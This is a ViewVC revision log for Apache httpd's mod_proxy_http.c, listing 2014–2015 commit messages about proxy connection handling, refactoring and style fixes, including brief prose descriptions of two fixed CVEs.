([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1721759&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1721759))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1721759)

Modified
*Sat Dec 26 21:29:21 2015 UTC*
(9 years, 1 month ago)
by *jim*

File length: 89103 byte(s)

Diff to [previous 1716151](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1716151&r2=1721759)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1716151&r2=1721759&diff_format=h))
```
Abstract out as macro

```

---

Revision [**1716151**](/viewvc?view=revision&revision=1716151) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1716151&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1716151&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1716151))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1716151)

Modified
*Tue Nov 24 14:38:54 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 89355 byte(s)

Diff to [previous 1715880](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715880&r2=1716151)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715880&r2=1716151&diff_format=h))
```
Follow up to [r1715880](/viewvc?view=revision&revision=1715880): revert abusive ap_casecmpstr[n]() usages.

```

---

Revision [**1715880**](/viewvc?view=revision&revision=1715880) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715880&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715880&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1715880))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1715880)

Modified
*Mon Nov 23 16:48:35 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 89385 byte(s)

Diff to [previous 1715876](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715876&r2=1715880)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715876&r2=1715880&diff_format=h))
```
More ap_casecmpstr[n]() usages (follow up to [r1715876](/viewvc?view=revision&revision=1715876)).

```

---

Revision [**1715876**](/viewvc?view=revision&revision=1715876) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715876&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715876&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1715876))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1715876)

Modified
*Mon Nov 23 16:46:01 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 89355 byte(s)

Diff to [previous 1715869](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715869&r2=1715876)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715869&r2=1715876&diff_format=h))
```
Use new ap_casecmpstr[n]() functions where appropriate (not exhaustive).

```

---

Revision [**1715869**](/viewvc?view=revision&revision=1715869) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715869&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715869&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1715869))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1715869)

Modified
*Mon Nov 23 16:28:36 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 89340 byte(s)

Diff to [previous 1715789](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715789&r2=1715869)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715789&r2=1715869&diff_format=h))
```
Revert [r1715789](/viewvc?view=revision&revision=1715789): will re-commit without spurious functional changes.

```

---

Revision [**1715789**](/viewvc?view=revision&revision=1715789) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715789&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715789&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1715789))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1715789)

Modified
*Mon Nov 23 12:33:09 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 89355 byte(s)

Diff to [previous 1715576](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715576&r2=1715789)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1715576&r2=1715789&diff_format=h))
```
Use new ap_casecmpstr[n]() functions where appropriate (not exhaustive).

[Reverted by [r1715869](/viewvc?view=revision&revision=1715869)]

```

---

Revision [**1715576**](/viewvc?view=revision&revision=1715576) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715576&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1715576&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1715576))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1715576)

Modified
*Sat Nov 21 21:14:19 2015 UTC*
(9 years, 2 months ago)
by *jailletc36*

File length: 89340 byte(s)

Diff to [previous 1690137](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1690137&r2=1715576)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1690137&r2=1715576&diff_format=h))
```
Remove some useless 'return' statements.
Fix style and alignment.

```

---

Revision [**1690137**](/viewvc?view=revision&revision=1690137) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1690137&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1690137&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1690137))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1690137)

Modified
*Thu Jul 9 18:07:50 2015 UTC*
(9 years, 6 months ago)
by *ylavic*

File length: 89335 byte(s)

Diff to [previous 1682907](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1682907&r2=1690137)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1682907&r2=1690137&diff_format=h))
```
s/\<\(\w\+\)\>\s\+\<\1\>/\1/g

```

---

Revision [**1682907**](/viewvc?view=revision&revision=1682907) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1682907&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1682907&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1682907))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1682907)

Modified
*Mon Jun 1 14:06:39 2015 UTC*
(9 years, 7 months ago)
by *ylavic*

File length: 89340 byte(s)

Diff to [previous 1681694](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1681694&r2=1682907)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1681694&r2=1682907&diff_format=h))
```
mod_proxy: follow up to [r1681694](/viewvc?view=revision&revision=1681694).

Handle the proxy-error-override note also in mod_proxy_ajp.

The note is not needed in mod_proxy_fcgi (which also handles
ProxyErrorOverride) since it calls ap_die() by itself, and always
returns OK to proxy_handler().

Add a comment about the note where used.

```

---

Revision [**1681694**](/viewvc?view=revision&revision=1681694) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1681694&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1681694&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1681694))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1681694)

Modified
*Tue May 26 07:25:08 2015 UTC*
(9 years, 8 months ago)
by *ylavic*

File length: 89214 byte(s)

Diff to [previous 1678771](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1678771&r2=1681694)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1678771&r2=1681694&diff_format=h))
```
mod_proxy: Don't put the worker in error state for 500 or 503 errors
returned by the backend unless failonstatus is configured to.  PR 56925.

```

---

Revision [**1678771**](/viewvc?view=revision&revision=1678771) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1678771&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1678771&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1678771))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1678771)

Modified
*Mon May 11 15:48:58 2015 UTC*
(9 years, 8 months ago)
by *ylavic*

File length: 89147 byte(s)

Diff to [previous 1673368](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1673368&r2=1678771)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1673368&r2=1678771&diff_format=h))
```
mod_proxy_http: follow up to [r1656259](/viewvc?view=revision&revision=1656259).
The proxy connection may be NULL during prefetch, don't try to dereference it!
Still origin->keepalive will be set according to p_conn->close by the caller
(proxy_http_handler).

```

---

Revision [**1673368**](/viewvc?view=revision&revision=1673368) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1673368&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1673368&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1673368))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1673368)

Modified
*Tue Apr 14 06:03:13 2015 UTC*
(9 years, 9 months ago)
by *jailletc36*

File length: 89233 byte(s)

Diff to [previous 1658765](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1658765&r2=1673368)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1658765&r2=1673368&diff_format=h))
```
Remove some spaces between some return statements  and ';' + fix a strange formating in a 'for' loop

```

---

Revision [**1658765**](/viewvc?view=revision&revision=1658765) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1658765&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1658765&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1658765))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1658765)

Modified
*Tue Feb 10 17:25:54 2015 UTC*
(9 years, 11 months ago)
by *ylavic*

File length: 89239 byte(s)

Diff to [previous 1658760](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1658760&r2=1658765)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1658760&r2=1658765&diff_format=h))
```
mod_proxy_http: Use the "Connection: close" header for requests to
backends not recycling connections (disablereuse), including the default
reverse and forward proxies.

```

---

Revision [**1658760**](/viewvc?view=revision&revision=1658760) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1658760&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1658760&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1658760))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1658760)

Modified
*Tue Feb 10 17:03:05 2015 UTC*
(9 years, 11 months ago)
by *ylavic*

File length: 89215 byte(s)

Diff to [previous 1657897](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1657897&r2=1658760)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1657897&r2=1658760&diff_format=h))
```
mod_proxy_http: Don't expect the backend to ack the "Connection: close" to
finally close those not meant to be kept alive by SetEnv proxy-nokeepalive
or force-proxy-request-1.0, and respond with 502 instead of 400 if its
Connection header is invalid.

```

---

Revision [**1657897**](/viewvc?view=revision&revision=1657897) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1657897&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1657897&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1657897))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1657897)

Modified
*Fri Feb 6 16:54:16 2015 UTC*
(9 years, 11 months ago)
by *ylavic*

File length: 89154 byte(s)

Diff to [previous 1656259](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1656259&r2=1657897)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1656259&r2=1657897&diff_format=h))
```
mod_proxy(es): Avoid error response/document handling by the core if some
input filter already did it while reading client's payload.

When an input filter returns AP_FILTER_ERROR, it has already called ap_die()
or at least already responded to the client.

Here we don't want to lose AP_FILTER_ERROR when returning from proxy handlers,
so we use ap_map_http_request_error() to forward any AP_FILTER_ERROR to
ap_die() which knows whether a response needs to be completed or not.

Before this commit, returning an HTTP error code in this case caused a double
response to be generated.

Depends on [r1657881](/viewvc?view=revision&revision=1657881) to preserve r->status (for logging) when nothing is to be
done by ap_die() when handling AP_FILTER_ERROR.

```

---

Revision [**1656259**](/viewvc?view=revision&revision=1656259) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1656259&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1656259&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1656259))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1656259)

Modified
*Sun Feb 1 00:05:59 2015 UTC*
(9 years, 11 months ago)
by *ylavic*

File length: 89014 byte(s)

Diff to [previous 1620324](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1620324&r2=1656259)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1620324&r2=1656259&diff_format=h))
```
mod_proxy_http: don't connect or reuse backend before prefetching request body.

The goal is to minimize the delay between this connection is considered alive
and the first bytes sent (should the client's link be slow or some input filter
retain the data).
This is a best effort to prevent the backend from closing (from under us) what
it thinks is an idle connection, hence to reduce to the minimum the unavoidable
local ap_proxy_is_socket_connected() vs remote keepalive race condition.
PR 56541.

Also, allow the new subprocess_env variable "proxy-flushall" to prevent any
buffering of the request body before it is forwarded to the backend.
When set, the prefetch is still done (although non-blocking), so we can still
determine Content-Length vs chunked vs spooled (depending on data available
with the header or while reading it), and then all brigades are flushed when
passed to the backend.
PR 37920.

```

---

Revision [**1620324**](/viewvc?view=revision&revision=1620324) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1620324&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1620324&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1620324))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1620324)

Modified
*Mon Aug 25 13:44:03 2014 UTC*
(10 years, 5 months ago)
by *rjung*

File length: 83585 byte(s)

Diff to [previous 1615289](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1615289&r2=1620324)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1615289&r2=1620324&diff_format=h))
```
Switch preference for headers, Transfer-Encoding
first, Content-Length second.

Addition to [r1615289](/viewvc?view=revision&revision=1615289).

```

---

Revision [**1615289**](/viewvc?view=revision&revision=1615289) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1615289&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1615289&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1615289))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1615289)

Modified
*Sat Aug 2 08:24:35 2014 UTC*
(10 years, 5 months ago)
by *rjung*

File length: 83585 byte(s)

Diff to [previous 1610814](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1610814&r2=1615289)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1610814&r2=1615289&diff_format=h))
```
PR53420: Proxy responses with error status and
"ProxyErrorOverride On" hang until proxy timeout.

Regression from 2.2. It was introduced by [r912063](/viewvc?view=revision&revision=912063)
in order to fix PR41646.

```

---

Revision [**1610814**](/viewvc?view=revision&revision=1610814) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1610814&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1610814&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610814))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1610814)

Modified
*Tue Jul 15 19:11:02 2014 UTC*
(10 years, 6 months ago)
by *covener*

File length: 82905 byte(s)

Diff to [previous 1610674](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1610674&r2=1610814)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1610674&r2=1610814&diff_format=h))
```
  *) SECURITY: CVE-2013-5704 (cve.mitre.org)
     core: HTTP trailers could be used to replace HTTP headers
     late during request processing, potentially undoing or
     otherwise confusing modules that examined or modified
     request headers earlier.  Adds "MergeTrailers" directive to restore
     legacy behavior.

Submitted By: Edward Lu, Yann Ylavic, Joe Orton, Eric Covener
Committed By: covener

```

---

Revision [**1610674**](/viewvc?view=revision&revision=1610674) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1610674&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1610674&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1610674)

Modified
*Tue Jul 15 12:27:00 2014 UTC*
(10 years, 6 months ago)
by *jorton*

File length: 82296 byte(s)

Diff to [previous 1599486](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1599486&r2=1610674)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1599486&r2=1610674&diff_format=h))
```
SECURITY (CVE-2014-0117): Fix a crash in mod_proxy.  In a reverse
proxy configuration, a remote attacker could send a carefully crafted
request which could crash a server process, resulting in denial of
service.

Thanks to Marek Kroemeke working with HP's Zero Day Initiative for
reporting this issue.

* server/util.c (ap_parse_token_list_strict): New function.

* modules/proxy/proxy_util.c (find_conn_headers): Use it here.

* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response):
  Send a 400 for a malformed Connection header.

Submitted by: Edward Lu, breser, covener

```

---

Revision [**1599486**](/viewvc?view=revision&revision=1599486) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1599486&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1599486&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1599486))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1599486)

Modified
*Tue Jun 3 11:47:11 2014 UTC*
(10 years, 7 months ago)
by *ylavic*

File length: 82074 byte(s)

Diff to [previous 1588527](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1588527&r2=1599486)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1588527&r2=1599486&diff_format=h))
```
mod_proxy_http: avoid (unlikely) access to freed memory.

```

---

Revision [**1588527**](/viewvc?view=revision&revision=1588527) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1588527&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1588527&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1588527))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1588527)

Modified
*Fri Apr 18 17:38:15 2014 UTC*
(10 years, 9 months ago)
by *ylavic*

File length: 82108 byte(s)

Diff to [previous 1586719](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1586719&r2=1588527)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1586719&r2=1588527&diff_format=h))
```
mod_proxy: Preserve original request headers even if they differ
           from the ones to be forwarded to the backend. PR 45387.

```

---

Revision [**1586719**](/viewvc?view=revision&revision=1586719) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1586719&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1586719&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1586719))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1586719)

Modified
*Fri Apr 11 17:07:18 2014 UTC*
(10 years, 9 months ago)
by *trawick*

File length: 82373 byte(s)

Diff to [previous 1578760](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1578760&r2=1586719)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1578760&r2=1586719&diff_format=h))
```
mod_proxy_http: Add detach_backend hook.

The immediate use is for a SSL-related module which works
on the backend proxy connection to be able to "leak" information
into the client r for logging.

This could be useful with other proxy scheme handlers.

```

---

Revision [**1578760**](/viewvc?view=revision&revision=1578760) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1578760&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1578760&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1578760))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1578760)

Modified
*Tue Mar 18 06:52:08 2014 UTC*
(10 years, 10 months ago)
by *jailletc36*

File length: 81814 byte(s)

Diff to [previous 1575958](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1575958&r2=1578760)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1575958&r2=1578760&diff_format=h))
```
Use 'apr_table_setn' instead of 'apr_table_set' when possible in order to save memory.

```

---

Revision [**1575958**](/viewvc?view=revision&revision=1575958) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1575958&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1575958&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1575958))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1575958)

Modified
*Mon Mar 10 14:57:14 2014 UTC*
(10 years, 10 months ago)
by *trawick*

File length: 81813 byte(s)

Diff to [previous 1572630](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572630&r2=1575958)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572630&r2=1575958&diff_format=h))
```
fix spelling

```

---

Revision [**1572630**](/viewvc?view=revision&revision=1572630) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572630&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572630&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1572630))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1572630)

Modified
*Thu Feb 27 15:40:01 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 81812 byte(s)

Diff to [previous 1572627](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572627&r2=1572630)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572627&r2=1572630&diff_format=h))
```
Redo what was reverted in [r1572627](/viewvc?view=revision&revision=1572627).
Don't reuse a SSL backend connection whose SNI differs. PR 55782.
This may happen when ProxyPreserveHost is on and the proxy-worker
handles connections to different Hosts.

```

---

Revision [**1572627**](/viewvc?view=revision&revision=1572627) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572627&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572627&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1572627))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1572627)

Modified
*Thu Feb 27 15:31:58 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 82378 byte(s)

Diff to [previous 1572606](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572606&r2=1572627)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572606&r2=1572627&diff_format=h))
```
Revert [r1572606](/viewvc?view=revision&revision=1572606) for the time being since backport would conflict with 2.4.x's proxy_conn_rec.
The uds_path field is at the end of the struct in 2.4.x but not in trunk.
Fix that first, then recommit.

```

---

Revision [**1572606**](/viewvc?view=revision&revision=1572606) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572606&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572606&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1572606))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1572606)

Modified
*Thu Feb 27 14:52:12 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 81812 byte(s)

Diff to [previous 1572561](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572561&r2=1572606)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1572561&r2=1572606&diff_format=h))
```
Don't reuse a SSL backend connection whose SNI differs. PR 55782.
This may happen when ProxyPreserveHost is on and the proxy-worker
handles connections to different Hosts.

```

---

Revision [**1572561**](/viewvc?view=revision&revision=1572561) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572561&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1572561&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1572561))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1572561)

Modified
*Thu Feb 27 13:39:25 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 82378 byte(s)

Diff to [previous 1570598](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1570598&r2=1572561)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1570598&r2=1572561&diff_format=h))
```
Avoid useless functions calls.

```

---

Revision [**1570598**](/viewvc?view=revision&revision=1570598) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1570598&view=markup))
